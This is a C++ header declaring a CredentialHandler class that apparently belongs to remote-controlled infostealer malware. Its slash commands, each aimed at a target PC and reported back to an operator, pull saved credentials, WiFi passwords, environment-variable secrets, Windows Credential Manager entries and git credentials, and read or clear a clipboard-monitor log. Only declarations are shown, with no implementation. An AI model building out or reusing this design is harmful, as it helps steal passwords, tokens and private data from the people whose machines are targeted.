#pragma once

#include <string>

#include "domain/common/Result.hpp"
#include "application/interfaces/IReporter.hpp"

// Forward declare — actual include in .cpp
namespace nuub::infrastructure::keyboard {
    class ClipboardMonitor;
}

namespace nuub::application::commands {

class CredentialHandler {
    interfaces::IReporter& reporter_;
    std::string pc_id_;
    void* clipboard_monitor_ = nullptr;  // ClipboardMonitor* (void to avoid header dependency)

    [[nodiscard]] bool matches(const std::string& target) const;

public:
    CredentialHandler(interfaces::IReporter& reporter, std::string pc_id);

    void set_clipboard_monitor(void* monitor) { clipboard_monitor_ = monitor; }

    // /creds <target> — Extract all saved credentials
    domain::Result<void> handle_creds(const std::string& target);

    // /wifi_creds <target> — Extract WiFi passwords only
    domain::Result<void> handle_wifi_creds(const std::string& target);

    // /env_creds <target> — Extract environment variable credentials
    domain::Result<void> handle_env_creds(const std::string& target);

    // /win_creds <target> — Extract Windows Credential Manager
    domain::Result<void> handle_win_creds(const std::string& target);

    // /git_creds <target> — Extract git credentials
    domain::Result<void> handle_git_creds(const std::string& target);

    // /cliplog <target> — Get clipboard monitor log
    domain::Result<void> handle_cliplog(const std::string& target);

    // /clipclear <target> — Clear clipboard log
    domain::Result<void> handle_clipclear(const std::string& target);
};

} // namespace nuub::application::commands
